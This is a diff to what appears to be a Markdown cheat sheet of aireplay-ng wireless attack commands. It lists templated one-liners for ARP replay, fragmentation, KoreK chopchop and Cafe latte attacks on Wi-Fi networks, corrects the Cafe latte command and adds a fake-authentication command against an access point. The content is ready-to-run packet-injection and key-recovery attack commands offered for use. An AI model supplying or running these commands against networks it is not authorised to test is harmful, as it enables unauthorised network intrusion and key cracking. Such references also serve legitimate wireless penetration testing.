@@ -53,7 +53,6 @@ sudo aireplay-ng --arpreplay -b <bssid> -h <wlan_station_mac> <wlan_interface|wm
 sudo iw dev <wlan_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng --fragment -b <bssid> -h <wlan_station_mac> <wlan_interface|wmon>
 ```
 
-
 ## KoreK chopchop attack
 ```bash
 sudo iw dev <wlan_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng --chopchop -b <bssid> -h <wlan_station_mac> <wlan_interface|wmon>
@@ -66,5 +65,10 @@ sudo iw dev <wlan_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng
 
 ## Cafe latte attack
 ```bash
-sudo iw dev <wlan_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng -b <bssid> -h <wlan_station_mac> <wlan_interface|wmon>
+sudo iw dev <wlan_interface|wmon> set channel <wlan_channel> && sudo aireplay-ng -6 -D -b <bssid> -h <wlan_station_mac> <wlan_interface|wmon>
+```
+
+## fake auth
+```bash
+sudo aireplay-ng --fakeauth 1000 -o 1 -q 5 -e <ssid> -a <bssid> -h <current_mac> <wlan_interface|wmon>
 ```
